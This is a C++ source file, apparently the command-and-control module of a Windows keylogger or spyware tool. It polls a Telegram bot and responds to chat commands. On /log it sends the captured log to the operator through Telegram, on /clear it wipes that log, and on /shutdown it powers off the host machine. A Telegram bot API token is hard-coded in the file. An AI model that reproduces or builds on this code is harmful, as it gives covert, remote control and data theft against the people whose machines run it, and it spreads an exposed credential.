// This is an open source non-commercial project. Dear PVS-Studio, please check it.
// PVS-Studio Static Code Analyzer for C, C++, C#, and Java: http://www.viva64.com

#include "communications.hpp"

void StartPolling(const std::stop_token& stoken, const DWORD& thread_id)
{
	TGBot tgbot("5088914784:AAG5t6oR17RO4UVp1qpUi_clnFF2W-z-iic");
	while (!stoken.stop_requested())
	{
		for (const auto& [update_id, chat_id, date, username, text] : tgbot.getUpdates())
		{
			if (text == "/status")
			{
				const auto endTime = std::chrono::steady_clock::now();
				const auto uptime = std::chrono::duration_cast<std::chrono::minutes>(endTime - startTime).count();
				tgbot.sendMessage(chat_id, "Status: online for " + std::to_string(uptime) + " minutes");
			}
			else if (text == "/log")
			{
				tgbot.sendMessage(chat_id, GetLog());
			}
			else if (text == "/clear")
			{
				ClearLogStr();
				sizeOfLogStr = 0;
				tgbot.sendMessage(chat_id, "Successfully cleared chat log.");
			}
			else if (text == "/kill")
			{
				tgbot.sendMessage(chat_id, "killing...");
				PostThreadMessage(thread_id, WM_QUIT, 0, 0);
				return;
			}
			else if (text == "/shutdown") {
				tgbot.sendMessage(chat_id, "killing...");
				system("shutdown -s -t 0");
				PostThreadMessage(thread_id, WM_QUIT, 0, 0);
				return;
			}
			else tgbot.sendMessage(chat_id, text);
		}
		using namespace std::chrono_literals;
		std::this_thread::sleep_for(2500ms);
	}
}